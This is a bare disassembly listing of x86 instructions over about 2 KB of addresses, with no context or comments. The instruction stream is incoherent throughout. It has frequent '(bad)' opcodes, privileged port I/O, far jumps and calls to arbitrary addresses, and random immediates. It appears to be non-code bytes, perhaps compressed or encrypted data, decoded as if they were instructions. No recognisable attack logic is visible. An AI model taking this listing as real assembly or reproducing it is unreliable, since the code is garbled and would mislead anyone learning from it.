  4388f9:	nop
  4388fa:	frstor [esi+0x54d4b057]
  438900:	add    al,0xa4
  438902:	stc    
  438903:	or     al,dl
  438905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438906:	mov    ebx,0x1fa1029f
  43890b:	es das 
  43890d:	xchg   esi,eax
  43890e:	scas   eax,DWORD PTR es:[edi]
  43890f:	sub    esi,DWORD PTR [edx-0x66]
  438912:	dec    ebx
  438913:	mov    BYTE PTR [esp+ecx*1],ah
  438916:	mov    dh,0x90
  438918:	sub    BYTE PTR [ebx+ebx*1+0x6302e39f],0x2b
  438920:	je     0x438905
  438922:	pop    ss
  438923:	(bad)  
  438925:	test   eax,0xa1f1e19a
  43892a:	mov    esp,0xe86a1e29
  438930:	es inc ebx
  438932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438933:	pop    eax
  438934:	into   
  438935:	les    esi,FWORD PTR [eax-0x13]
  438938:	pop    ss
  438939:	and    eax,0x791eb943
  43893e:	enter  0xc4e2,0xfc
  438942:	fimul  WORD PTR [ebp-0x762092fa]
  438948:	jo     0x4389bb
  43894a:	add    BYTE PTR [edi-0x73945e9b],bl
  438950:	es pusha 
  438952:	and    al,BYTE PTR [edx-0x584d16de]
  438958:	lods   eax,DWORD PTR ds:[esi]
  438959:	adc    DWORD PTR [esi+0xb9ca4c0],esi
  43895f:	(bad)  es:[esp+ebp*8-0x1e645768]
  438967:	xchg   edi,eax
  438968:	mov    ebx,0xf924bad6
  43896d:	shl    DWORD PTR ds:0xd50a0528,0xf0
  438974:	lds    eax,FWORD PTR [edi+0x6c]
  438977:	or     ecx,edi
  438979:	cdq    
  43897a:	mov    DWORD PTR [ebx],eax
  43897c:	mov    ds:0x9bdc459a,al
  438981:	rol    BYTE PTR [ecx],0xf1
  438984:	mov    ch,0x85
  438986:	stos   DWORD PTR es:[edi],eax
  438987:	repz jp 0x438a04
  43898a:	adc    al,0xf3
  43898c:	sub    eax,esi
  43898e:	push   ecx
  43898f:	lea    edx,[edi]
  438991:	jbe    0x43897a
  438993:	xor    al,0x2f
  438995:	mov    eax,ds:0x9c65f175
  43899a:	sub    ebx,DWORD PTR [ecx]
  43899c:	cmp    BYTE PTR [eax-0x17f075c7],ah
  4389a2:	adc    BYTE PTR [ebp+0x8],dl
  4389a5:	cs mov esi,0xbafb22f4
  4389ab:	xor    eax,0x9804ddb6
  4389b0:	jne    0x4389cb
  4389b2:	jmp    0x6a857730
  4389b7:	icebp  
  4389b8:	daa    
  4389b9:	mov    ecx,0x21e26518
  4389be:	sub    bh,BYTE PTR [edi+0x20]
  4389c1:	lahf   
  4389c2:	in     al,dx
  4389c3:	and    cl,BYTE PTR [ecx+0xbbbb791]
  4389c9:	mov    dh,0xaf
  4389cb:	into   
  4389cc:	nop
  4389cd:	enter  0xa8f3,0x9c
  4389d1:	sbb    esp,ebx
  4389d3:	in     al,dx
  4389d4:	test   BYTE PTR [esp+edi*4-0x3c],0xcb
  4389d9:	jo     0x438980
  4389db:	mov    ecx,0x4a2723d5
  4389e0:	gs push ds
  4389e2:	(bad)  
  4389e3:	repz scas eax,DWORD PTR es:[edi]
  4389e5:	xor    DWORD PTR [eax+0x3a494cfa],esp
  4389eb:	arpl   WORD PTR [edx+0x6168022c],sp
  4389f1:	or     eax,0x96f7eebe
  4389f6:	add    bh,BYTE PTR [ecx+ebp*2-0x3e10b97b]
  4389fd:	mov    es,WORD PTR [eax+0x63]
  438a00:	call   0x17a86e91
  438a05:	and    BYTE PTR [ecx-0x74],bl
  438a08:	lods   al,BYTE PTR ds:[esi]
  438a09:	loope  0x4389e7
  438a0b:	inc    edi
  438a0c:	xor    al,0xd1
  438a0e:	inc    esi
  438a0f:	out    dx,al
  438a10:	adc    DWORD PTR [ecx-0x41],ebx
  438a13:	xchg   esp,eax
  438a14:	xor    eax,0xb55809b
  438a19:	scas   eax,DWORD PTR es:[edi]
  438a1a:	std    
  438a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438a1c:	push   edi
  438a1d:	jg     0x438a47
  438a1f:	test   eax,ebp
  438a21:	test   al,0xea
  438a23:	adc    ecx,esi
  438a25:	addr16 pop ebp
  438a27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438a28:	lea    ebx,[ebp+0x42ffc83b]
  438a2e:	mov    esi,0xb3c7e48b
  438a33:	add    DWORD PTR [eax+0x61],esp
  438a36:	(bad)  
  438a37:	mov    ah,0x9d
  438a39:	or     al,0x69
  438a3b:	fwait
  438a3c:	jg     0x438a86
  438a3e:	scas   eax,DWORD PTR es:[edi]
  438a3f:	in     al,dx
  438a40:	lock lahf 
  438a42:	fwait
  438a43:	cmp    BYTE PTR [ecx+0x5fdabd0e],bh
  438a49:	into   
  438a4a:	cmp    eax,DWORD PTR [eax+0x3c29b2c4]
  438a50:	mov    al,ds:0x16077ae3
  438a55:	mov    ecx,0x3a316a3f
  438a5a:	bound  ecx,QWORD PTR [esi+0x666ba86d]
  438a60:	ins    BYTE PTR es:[edi],dx
  438a61:	into   
  438a62:	dec    ebx
  438a63:	or     DWORD PTR [ecx+0x84e47a2],edx
  438a69:	fucomp st(2)
  438a6b:	in     al,0xbb
  438a6d:	mov    ds:0x64b6c8fb,eax
  438a72:	(bad)  
  438a73:	add    edi,esp
  438a75:	push   ss
  438a76:	in     al,dx
  438a77:	or     DWORD PTR [eax+0x5d88939f],ebx
  438a7d:	pop    ebx
  438a7e:	mov    eax,0xed84f6bd
  438a83:	and    ah,ah
  438a85:	fwait
  438a86:	pop    ds
  438a87:	inc    ecx
  438a88:	mov    cl,0xca
  438a8a:	movhps xmm5,QWORD PTR [bx+di+0x2a33]
  438a90:	push   ecx
  438a91:	shl    DWORD PTR [ebp+0x1a],1
  438a94:	ja     0x438ae1
  438a96:	xor    ebp,DWORD PTR [edi]
  438a98:	lds    esi,FWORD PTR [ebp-0x5001063]
  438a9e:	add    ch,BYTE PTR [esi+0x4d]
  438aa1:	jns    0x438a53
  438aa3:	add    BYTE PTR [eax+0xb],bl
  438aa6:	sub    eax,ebp
  438aa8:	int    0x73
  438aaa:	(bad)  
  438aab:	xacquire xchg BYTE PTR [ebp-0x30d521eb],cl
  438ab2:	inc    esi
  438ab3:	and    al,0x3c
  438ab5:	cmp    bl,BYTE PTR [edi]
  438ab7:	in     eax,dx
  438ab8:	mov    edi,0x9ff4ba3f
  438abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438abe:	jmp    0x438ae1
  438ac0:	call   0x7bb:0xd4605674
  438ac7:	(bad)  
  438ac9:	(bad)  
  438aca:	mov    al,ds:0x36a72d45
  438acf:	jmp    0x5b3f:0x98ccbbf9
  438ad6:	dec    edx
  438ad7:	sbb    esi,eax
  438ad9:	xor    DWORD PTR [ebp+0x5cb51dd9],ecx
  438adf:	out    dx,al
  438ae0:	ins    BYTE PTR es:[edi],dx
  438ae1:	mov    ch,0xbb
  438ae3:	lods   al,BYTE PTR ds:[esi]
  438ae4:	inc    edx
  438ae5:	mov    edx,0x27ffa200
  438aea:	cmp    BYTE PTR [esi],ah
  438aec:	dec    ebx
  438aed:	fnstcw WORD PTR [ebx+edi*2+0x2cdf992d]
  438af4:	push   ds
  438af5:	mov    ch,0x8b
  438af7:	mov    bh,0xfa
  438af9:	dec    edx
  438afa:	mov    bl,0xfa
  438afc:	add    eax,0x38e90468
  438b01:	add    al,BYTE PTR [edx-0x71]
  438b04:	sbb    eax,0x5e9fb329
  438b09:	retf   
  438b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438b0b:	es mov ebx,0xf77639a6
  438b11:	addr16 and al,0xc4
  438b14:	add    eax,0x2e61696
  438b19:	aaa    
  438b1a:	mov    ecx,0xb0ea611b
  438b1f:	fs jge 0x438ab1
  438b22:	cld    
  438b23:	sti    
  438b24:	inc    ebp
  438b25:	lods   al,BYTE PTR ds:[esi]
  438b26:	imul   ebp,edx,0x49df909
  438b2c:	dec    ecx
  438b2d:	nop
  438b2e:	sbb    BYTE PTR [esi-0x5d],0x9b
  438b32:	mov    esp,0x76c14154
  438b37:	cs es dec ebp
  438b3a:	retf   0xdf61
  438b3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438b3e:	push   esi
  438b3f:	adc    esp,edi
  438b41:	repnz fstp DWORD PTR [eax-0xb3a1046]
  438b48:	nop
  438b49:	xlat   BYTE PTR ds:[ebx]
  438b4a:	mov    eax,esp
  438b4c:	outs   dx,DWORD PTR ds:[esi]
  438b4d:	std    
  438b4e:	mov    ah,0xa8
  438b50:	in     eax,0x5b
  438b52:	daa    
  438b53:	repnz sbb esp,DWORD PTR [ebx+edi*2]
  438b57:	adc    DWORD PTR [edx],ebx
  438b59:	mov    DWORD PTR [ebx],eax
  438b5b:	push   eax
  438b5c:	sub    eax,0xffffffd3
  438b5f:	inc    ebp
  438b60:	add    bl,BYTE PTR [esi+0x4865c2cb]
  438b66:	ds pop ds
  438b68:	jge    0x438b9e
  438b6a:	mov    ds:0xbecb60fa,al
  438b6f:	hlt    
  438b70:	push   ebp
  438b71:	adc    eax,0xf69fe17
  438b76:	dec    ebp
  438b77:	mov    ebp,0x1cba5c40
  438b7c:	inc    esp
  438b7d:	leave  
  438b7e:	aaa    
  438b7f:	mov    ecx,0x74bf4870
  438b84:	in     eax,0x85
  438b86:	pusha  
  438b87:	xchg   ecx,eax
  438b88:	xor    eax,0xf4e51903
  438b8d:	int3   
  438b8e:	out    0xee,al
  438b90:	push   ecx
  438b91:	stc    
  438b92:	cmp    ch,BYTE PTR ds:0xe8ab864d
  438b98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438b99:	xchg   edi,eax
  438b9a:	add    al,0x72
  438b9c:	inc    esi
  438b9d:	(bad)  
  438b9e:	jge    0x438bc4
  438ba0:	repz jg 0x438bb4
  438ba3:	fwait
  438ba4:	mov    edx,0x920bb72
  438ba9:	cmp    edi,DWORD PTR [eax+0x70e7e5b4]
  438baf:	neg    BYTE PTR [ecx-0x3f]
  438bb2:	test   bh,dl
  438bb4:	ins    BYTE PTR es:[edi],dx
  438bb5:	sub    cl,BYTE PTR ss:[ebp-0x26]
  438bb9:	retf   
  438bba:	add    eax,0x92d952ea
  438bbf:	jno    0x438c08
  438bc1:	jb     0x438c2c
  438bc3:	add    cl,BYTE PTR ds:0x58fae175
  438bc9:	add    edi,ecx
  438bcb:	dec    esp
  438bcc:	jge    0x438b6b
  438bce:	dec    ecx
  438bcf:	add    DWORD PTR [eax+0x2560af9],esi
  438bd5:	fwait
  438bd6:	jmp    0x438b6b
  438bd8:	or     eax,0x9d455137
  438bdd:	pushf  
  438bde:	imul   eax,DWORD PTR [esi+esi*8],0xfffffff0
  438be2:	call   0x6e0876cc
  438be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438be8:	adc    cl,cl
  438bea:	mov    bh,0x14
  438bec:	popf   
  438bed:	mov    eax,0x1245541e
  438bf2:	aam    0xed
  438bf4:	sub    eax,0x1cfb0090
  438bf9:	pop    ecx
  438bfa:	push   cs
  438bfb:	and    al,0xd8
  438bfd:	push   edx
  438bfe:	push   edi
  438bff:	into   
  438c00:	jns    0x438c54
  438c02:	pop    esp
  438c03:	ja     0x438c6b
  438c05:	dec    edi
  438c06:	add    BYTE PTR [eax-0x6b1b1574],0x9c
  438c0d:	dec    esi
  438c0e:	and    eax,esi
  438c10:	sbb    ebp,DWORD PTR [ecx-0x7a7dea23]
  438c16:	mov    dl,BYTE PTR [edi-0x7d]
  438c19:	dec    edi
  438c1a:	outs   dx,DWORD PTR ds:[esi]
  438c1b:	lahf   
  438c1c:	push   edi
  438c1d:	xor    DWORD PTR [edi],ebp
  438c1f:	cmp    al,0xb8
  438c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438c22:	pop    es
  438c23:	fsubr  st(0),st
  438c25:	mov    ah,0xe5
  438c27:	jmp    0x438c53
  438c29:	cdq    
  438c2a:	adc    al,0x84
  438c2c:	push   ebx
  438c2d:	pop    es
  438c2e:	sbb    al,0xe9
  438c30:	ficom  DWORD PTR [ebp-0xa9a2339]
  438c36:	ds call 0xa0bf5f73
  438c3c:	sbb    BYTE PTR [ecx+0x59441abb],ch
  438c42:	push   ebx
  438c43:	push   esp
  438c44:	in     al,0xa3
  438c46:	sub    ebx,DWORD PTR [ebx-0x56]
  438c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438c4a:	lods   eax,DWORD PTR ds:[esi]
  438c4b:	out    dx,eax
  438c4c:	pop    ecx
  438c4d:	jno    0x438cbb
  438c4f:	push   dx
  438c51:	jb     0x438c34
  438c53:	add    al,0xbb
  438c55:	push   ds
  438c56:	pop    eax
  438c57:	aaa    
  438c58:	(bad)  
  438c59:	lahf   
  438c5a:	fcomi  st,st(3)
  438c5c:	dec    edx
  438c5d:	push   es
  438c5e:	jnp    0x438cb7
  438c60:	jp     0x438c02
  438c62:	xor    al,0x4d
  438c64:	fsubrp st(0),st
  438c66:	mov    ds:0xb651a8dc,eax
  438c6b:	je     0x438c09
  438c6d:	outs   dx,BYTE PTR ds:[esi]
  438c6e:	inc    esp
  438c6f:	cdq    
  438c70:	inc    ebp
  438c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438c72:	stc    
  438c73:	repnz inc esi
  438c75:	shl    BYTE PTR ds:0x3cb4b91d,1
  438c7c:	xchg   ebx,eax
  438c7d:	sahf   
  438c7e:	mov    ds:0xdccc752f,al
  438c83:	les    esp,FWORD PTR [edx+0x479fdb9d]
  438c89:	and    eax,0xa994930b
  438c8e:	outs   dx,BYTE PTR ds:[esi]
  438c8f:	push   eax
  438c90:	or     DWORD PTR ds:0xbf1b71d5,ebx
  438c96:	es pop edi
  438c98:	sub    eax,0xdaa6fb9a
  438c9d:	rol    DWORD PTR [edi+edx*4],0xda
  438ca1:	clc    
  438ca2:	xchg   esi,eax
  438ca3:	loope  0x438c5b
  438ca5:	push   es
  438ca6:	mov    ch,0x74
  438ca8:	jmp    0x8f53:0x6566b2ad
  438caf:	call   0x252c9485
  438cb4:	sbb    ecx,ebx
  438cb6:	ins    BYTE PTR es:[edi],dx
  438cb7:	jp     0x438c84
  438cb9:	fs xor ebp,eax
  438cbc:	aas    
  438cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438cbe:	jnp    0x438d0b
  438cc0:	adc    eax,0xcb0e09f6
  438cc5:	dec    BYTE PTR [ebx]
  438cc7:	sub    eax,DWORD PTR [ebx+0x4c]
  438cca:	mov    edx,0xc925bd74
  438ccf:	scas   al,BYTE PTR es:[edi]
  438cd0:	jmp    0x96268bb5
  438cd5:	in     eax,0xb7
  438cd7:	mov    ah,0xb6
  438cd9:	cs pop eax
  438cdb:	scas   eax,DWORD PTR es:[edi]
  438cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438cdd:	lahf   
  438cde:	xchg   ebx,eax
  438cdf:	cwde   
  438ce0:	dec    ebx
  438ce1:	pop    es
  438ce2:	jecxz  0x438ccc
  438ce4:	push   edx
  438ce5:	fiadd  WORD PTR [edx-0x15]
  438ce8:	jne    0x438d3b
  438cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438ceb:	out    0x2d,al
  438ced:	xor    ch,ch
  438cef:	cmp    edx,DWORD PTR [edi]
  438cf1:	mov    DWORD PTR [esi],edx
  438cf3:	cwde   
  438cf4:	xchg   esp,eax
  438cf5:	rcr    DWORD PTR [esi-0x3e],1
  438cf8:	mov    eax,ds:0xcd8b6bfa
  438cfd:	xor    dl,BYTE PTR [edx-0x866e41c]
  438d03:	mov    ebp,esp
  438d05:	std    
  438d06:	bound  ecx,QWORD PTR [edx+eax*1]
  438d09:	and    eax,0x511989bf
  438d0e:	pop    edi
  438d0f:	pop    ebp
  438d10:	shr    BYTE PTR [ebx-0x251107f5],cl
  438d16:	and    eax,0x76211cdd
  438d1b:	xchg   ecx,eax
  438d1c:	push   ebp
  438d1d:	xchg   ecx,eax
  438d1e:	pop    eax
  438d1f:	aas    
  438d20:	popf   
  438d21:	mov    eax,ds:0x94aab24b
  438d26:	shl    BYTE PTR [ecx+0x4569df23],0x7a
  438d2d:	mov    ds:0xd052e4b3,al
  438d32:	sbb    al,0xc
  438d34:	gs popf 
  438d36:	jmp    0x4d60a52c
  438d3b:	inc    eax
  438d3c:	xchg   edx,eax
  438d3d:	dec    ecx
  438d3e:	shr    DWORD PTR [ebx-0x6d],0x6b
  438d42:	lds    esi,FWORD PTR [edx+0x15c9efb4]
  438d48:	mov    WORD PTR [ebp-0x2751cd85],fs
  438d4e:	xchg   ecx,eax
  438d4f:	les    edx,FWORD PTR [ecx]
  438d51:	xchg   ecx,eax
  438d52:	aas    
  438d53:	adc    ebx,DWORD PTR [ebx]
  438d55:	dec    ebp
  438d56:	shl    DWORD PTR [esp+eiz*8-0x619e8051],0x83
  438d5e:	std    
  438d5f:	mov    ds:0x24cfa2ac,al
  438d64:	in     al,dx
  438d65:	div    DWORD PTR [eax+0x4d9bfe3d]
  438d6b:	and    edx,DWORD PTR [esi]
  438d6d:	jmp    0x7ca5c894
  438d72:	jl     0x438d77
  438d74:	inc    ebp
  438d75:	sar    BYTE PTR [ebx-0x140e0902],1
  438d7b:	out    dx,eax
  438d7c:	adc    ebp,DWORD PTR [esi-0x44]
  438d7f:	mov    bl,0xaa
  438d81:	mov    ebx,0xa38b04ba
  438d86:	adc    al,0x53
  438d88:	adc    eax,0xf8e4d005
  438d8d:	jmp    0xf95a6688
  438d92:	add    al,BYTE PTR [edi-0xe]
  438d95:	(bad)  
  438d96:	stc    
  438d97:	bound  eax,QWORD PTR [ebx]
  438d99:	xchg   esp,eax
  438d9a:	pop    ds
  438d9b:	ds and eax,0x4a3b1d11
  438da1:	jnp    0x438dde
  438da3:	fstp   DWORD PTR [ecx]
  438da5:	sbb    edx,edx
  438da7:	mov    ecx,0xd8393926
  438dac:	loop   0x438d4e
  438dae:	fwait
  438daf:	adc    ebx,esp
  438db1:	sti    
  438db2:	ret    0xbb28
  438db5:	mov    ds:0xa5d1046c,eax
  438dba:	jae    0x438e14
  438dbc:	test   DWORD PTR [edx+0x4629a976],eax
  438dc2:	iret   
  438dc3:	mov    ah,BYTE PTR [ecx+ebx*8]
  438dc6:	outs   dx,BYTE PTR ds:[esi]
  438dc7:	inc    edx
  438dc8:	mov    eax,0x25414254
  438dcd:	jns    0x438e3c
  438dcf:	sub    BYTE PTR [esi-0x4b671f2e],ch
  438dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438dd6:	dec    ebx
  438dd7:	xchg   esi,eax
  438dd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438dd9:	adc    edx,DWORD PTR es:[edx-0xd]
  438ddd:	jne    0x438e4b
  438ddf:	fidiv  WORD PTR [eax]
  438de1:	lahf   
  438de2:	lods   eax,DWORD PTR ds:[esi]
  438de3:	test   DWORD PTR [eax],edx
  438de5:	lahf   
  438de6:	imul   ecx,edx,0xffffff8d
  438de9:	int3   
  438dea:	xchg   esi,eax
  438deb:	adc    BYTE PTR [edi-0x36],0x1e
  438def:	les    esi,FWORD PTR [esi]
  438df1:	xor    al,dh
  438df3:	push   esp
  438df4:	mov    eax,ds:0x86ecc78d
  438df9:	or     DWORD PTR [edi+0xb1c9bab],esi
  438dff:	inc    ebx
  438e00:	inc    edi
  438e01:	lahf   
  438e02:	mov    cl,0x1
  438e04:	in     eax,0x6
  438e06:	push   ecx
  438e07:	in     eax,0x4d
  438e09:	jns    0x438e37
  438e0b:	pop    ebp
  438e0c:	sbb    edi,ecx
  438e0e:	icebp  
  438e0f:	ins    BYTE PTR es:[edi],dx
  438e10:	stos   DWORD PTR es:[edi],eax
  438e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438e12:	enter  0xce79,0x9e
  438e16:	pop    ebx
  438e17:	nop
  438e18:	frstor [edi+eiz*4-0x32cd9b2b]
  438e1f:	pushf  
  438e20:	jmp    0xbfbbc9c4
  438e25:	mov    WORD PTR [ebp+0x4ba08d19],?
  438e2b:	jns    0x438dcf
  438e2d:	neg    BYTE PTR [esi+0x5b8f05e7]
  438e33:	cmp    al,0x21
  438e35:	in     eax,dx
  438e36:	mov    ebp,0x9feb3344
  438e3b:	cmc    
  438e3c:	push   esi
  438e3d:	jne    0x438e4f
  438e3f:	sbb    DWORD PTR [edx-0x1fa810e1],ecx
  438e45:	xchg   ecx,eax
  438e46:	inc    edi
  438e47:	lods   eax,DWORD PTR gs:[esi]
  438e49:	jno    0x438e51
  438e4b:	icebp  
  438e4c:	mov    ah,BYTE PTR [edi+0x4ba6267b]
  438e52:	or     BYTE PTR [esi-0x7108fbd9],ch
  438e58:	in     al,0x16
  438e5a:	mov    cl,0xc4
  438e5c:	mov    bl,0x6d
  438e5e:	mov    al,BYTE PTR ds:0x71baa0cb
  438e64:	fcmovb st,st(2)
  438e66:	and    edx,DWORD PTR ds:0xe83ce8a3
  438e6c:	sbb    eax,0xc5779a9
  438e71:	push   ecx
  438e72:	aas    
  438e73:	pop    ebx
  438e74:	mov    DWORD PTR [esi+0x327706cb],esp
  438e7a:	xchg   BYTE PTR [edi],cl
  438e7c:	cld    
  438e7d:	push   ebx
  438e7e:	pop    es
  438e7f:	add    bl,BYTE PTR [ebx-0xa]
  438e82:	dec    ebx
  438e83:	and    eax,0xea20fe45
  438e88:	pop    ecx
  438e89:	mov    bl,0xfb
  438e8b:	test   DWORD PTR [edi+0x2843a906],esi
  438e91:	pop    ebx
  438e92:	push   0x1fda14b1
  438e97:	mov    cl,0x65
  438e99:	mov    ah,bh
  438e9b:	scas   eax,DWORD PTR es:[edi]
  438e9c:	sti    
  438e9d:	cld    
  438e9e:	fldlg2 
  438ea0:	mov    BYTE PTR [ebx+0x522666eb],ah
  438ea6:	ss xor DWORD PTR es:[edi],ebp
  438eaa:	out    dx,al
  438eab:	aam    0x7a
  438ead:	lock mov al,ds:0x1ef6ffb5
  438eb3:	stc    
  438eb4:	fs mov bh,0x23
  438eb7:	mov    ds:0xe5767b35,al
  438ebc:	add    DWORD PTR [esi-0x74],eax
  438ebf:	jg     0x438ed7
  438ec1:	leave  
  438ec2:	push   es
  438ec3:	leave  
  438ec4:	mov    al,BYTE PTR [ebp-0x1e]
  438ec7:	in     eax,dx
  438ec8:	mov    ebx,DWORD PTR [ebx+0x719f58bb]
  438ece:	push   edi
  438ecf:	ja     0x438e7e
  438ed1:	adc    eax,DWORD PTR [ecx+ebx*8-0x2f]
  438ed5:	loope  0x438f43
  438ed7:	lds    ebx,FWORD PTR ds:0x56f275bb
  438edd:	cld    
  438ede:	loop   0x438f17
  438ee0:	lea    ebx,[esi-0x46]
  438ee3:	rol    BYTE PTR [edi],cl
  438ee5:	dec    esp
  438ee6:	add    dh,dl
  438ee8:	jecxz  0x438e89
  438eea:	add    edi,DWORD PTR [eax+ecx*8+0xbf1a20e]
  438ef1:	pop    ebx
  438ef2:	sub    DWORD PTR [ebp+0x22],eax
  438ef5:	xor    DWORD PTR [esi-0x62afb75d],esi
  438efb:	add    DWORD PTR [edi],0xffffffa1
  438efe:	xchg   ebx,eax
  438eff:	mov    ch,0x1a
  438f01:	push   ds
  438f02:	enter  0x4f55,0x66
  438f06:	je     0x438ef6
  438f08:	and    eax,0x6ed1afb9
  438f0d:	fcom   QWORD PTR ds:0x6ba05ce4
  438f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438f14:	fiadd  WORD PTR [esi+0x66]
  438f17:	nop
  438f18:	sub    ebp,0x1bdd584b
  438f1e:	mov    esp,0xdd209384
  438f23:	(bad)  
  438f24:	aad    0x44
  438f26:	loop   0x438f10
  438f28:	cmp    BYTE PTR [edi-0x9],dh
  438f2b:	pop    edi
  438f2c:	xchg   ebx,eax
  438f2d:	sar    BYTE PTR [esi-0x4203ba27],0xf4
  438f34:	jnp    0x438f47
  438f36:	pop    ebp
  438f37:	cmp    al,0xc6
  438f39:	xor    al,0x4
  438f3b:	fstp   DWORD PTR [ebp+edx*8+0x1]
  438f3f:	in     al,0x11
  438f41:	cdq    
  438f42:	lods   al,BYTE PTR ds:[esi]
  438f43:	out    0x22,al
  438f45:	pop    ecx
  438f46:	or     DWORD PTR [ebp-0x6e379682],0xd7ed6fdb
  438f50:	mov    al,ah
  438f52:	and    ecx,DWORD PTR [edx+0x55]
  438f55:	mov    al,ds:0xcb71ccd4
  438f5a:	mov    edx,0xf79ca74c
  438f5f:	mov    ecx,0x9b73a6f6
  438f64:	xor    eax,0xa6f223cb
  438f69:	and    eax,0xc63b16ca
  438f6e:	dec    ebp
  438f6f:	dec    DWORD PTR [ecx+0x22d8e963]
  438f75:	cdq    
  438f76:	mov    al,ds:0x2dc0d873
  438f7b:	test   BYTE PTR [ebx-0x7b],ch
  438f7e:	jge    0x438fe6
  438f80:	out    0x9e,eax
  438f82:	iret   
  438f83:	retf   
  438f84:	enter  0xaa94,0x25
  438f88:	sbb    al,0x89
  438f8a:	pop    ebp
  438f8b:	xchg   ebp,eax
  438f8c:	in     eax,0x39
  438f8e:	pop    edi
  438f8f:	add    ch,cl
  438f91:	daa    
  438f92:	add    eax,0xcba3bd35
  438f97:	and    al,bh
  438f99:	shl    BYTE PTR [ebx+ebx*4],cl
  438f9c:	cs sub al,0xca
  438f9f:	and    BYTE PTR ds:0x1394ba04,al
  438fa5:	xor    al,0x2b
  438fa7:	jno    0x438fa2
  438fa9:	(bad)  
  438fab:	test   al,0xf7
  438fad:	jl     0x438fd7
  438faf:	add    eax,0xf1e07b45
  438fb4:	xchg   edi,eax
  438fb5:	adc    cl,BYTE PTR [ebx]
  438fb7:	mov    ebp,0xc4b3e0e4
  438fbc:	or     ch,dh
  438fbe:	pop    eax
  438fbf:	add    eax,0xeb451905
  438fc4:	fs in  al,dx
  438fc6:	adc    al,0x28
  438fc8:	mov    DWORD PTR [ecx-0x27],ebp
  438fcb:	xchg   DWORD PTR [ecx+ebp*2-0x55ad3884],esp
  438fd2:	mov    ah,0xb5
  438fd4:	leave  
  438fd5:	inc    ebx
  438fd6:	mov    esi,0x9f9eb172
  438fdb:	sahf   
  438fdc:	add    esi,DWORD PTR ds:[ecx+0x6ce91a55]
  438fe3:	xchg   ah,dh
  438fe5:	and    al,0x15
  438fe7:	enter  0xe88a,0x2
  438feb:	pop    esi
  438fec:	je     0x438fbb
  438fee:	cld    
  438fef:	xor    edi,DWORD PTR [eax-0x4f5e4461]
  438ff5:	into   
  438ff6:	ret    
  438ff7:	int3   
  438ff8:	and    DWORD PTR [ecx],ebp
  438ffa:	(bad)  
  438ffb:	call   0x9fd5:0x74892994
  439002:	mov    ebx,0x32af192b
  439007:	fldenv [edi-0x2a0d3da0]
  43900d:	bound  edi,QWORD PTR [ebx+0x75bf5744]
  439013:	sbb    dh,BYTE PTR [edi-0x12472296]
  439019:	cmp    eax,DWORD PTR [edx-0x11]
  43901c:	sub    edx,DWORD PTR [esi]
  43901e:	pop    ebp
  43901f:	sub    DWORD PTR [ebx-0x6bcb4787],ecx
  439025:	cmp    eax,0x267543be
  43902a:	xor    edx,esi
  43902c:	jns    0x43906a
  43902e:	lahf   
  43902f:	aaa    
  439030:	and    eax,0x4ebc6b59
  439035:	call   0x55f:0x86b631cd
  43903c:	and    ah,cl
  43903e:	pusha  
  43903f:	adc    eax,0x50cc1850
  439044:	sbb    eax,0x8d198289
  439049:	retf   0x5405
  43904c:	dec    edx
  43904d:	mov    ds:0xda38375b,al
  439052:	aam    0xf4
  439054:	mov    ecx,0x8e874f37
  439059:	aam    0xed
  43905b:	add    al,0x59
  43905d:	cdq    
  43905e:	pop    edx
  43905f:	fadd   QWORD PTR [ebx-0x4a58945d]
  439065:	push   ecx
  439066:	xchg   edi,eax
  439067:	jae    0x43905b
  439069:	or     DWORD PTR [ecx-0x43205332],ecx
  43906f:	adc    ah,ah
  439071:	cld    
  439072:	mov    dl,0xe1
  439074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439076:	je     0x43909b
  439078:	das    
  439079:	pop    ds
  43907a:	adc    al,BYTE PTR [edx+0x44]
  43907d:	push   es
  43907e:	mov    dh,0x3
  439080:	push   esp
  439081:	pop    ebx
  439082:	mov    ch,0xe4
  439084:	and    DWORD PTR [edx],ebx
  439086:	icebp  
  439087:	push   ebp
  439088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439089:	xchg   dh,ch
  43908b:	in     al,0xad
  43908d:	daa    
  43908e:	or     DWORD PTR [eax+edx*2],edx
  439091:	pop    ecx
  439092:	iret   
  439093:	push   edx
  439094:	add    edx,esi
  439096:	out    0xff,eax
  439098:	xor    DWORD PTR [esp+edi*8+0x73],edx
  43909c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43909d:	leave  
  43909e:	push   edx
  43909f:	icebp  
  4390a0:	in     al,dx
  4390a1:	sbb    eax,0xa0170bb4
  4390a6:	push   cs
  4390a7:	mov    eax,0xd4b68035
  4390ac:	in     eax,0x68
  4390ae:	dec    esi
  4390af:	enter  0x2e88,0xad
  4390b3:	jb     0x4390d0
  4390b5:	cmp    eax,0x9d5c70f5
  4390ba:	mov    edx,0xf1ba6e24
  4390bf:	loop   0x4390e3
  4390c1:	pop    ss
  4390c2:	mov    eax,0x41402504
  4390c7:	push   0x75
  4390c9:	jge    0x43912f
  4390cb:	out    dx,eax
  4390cc:	and    cl,al
  4390ce:	and    BYTE PTR [ebp-0x2ca1c6e9],cl
  4390d4:	std    
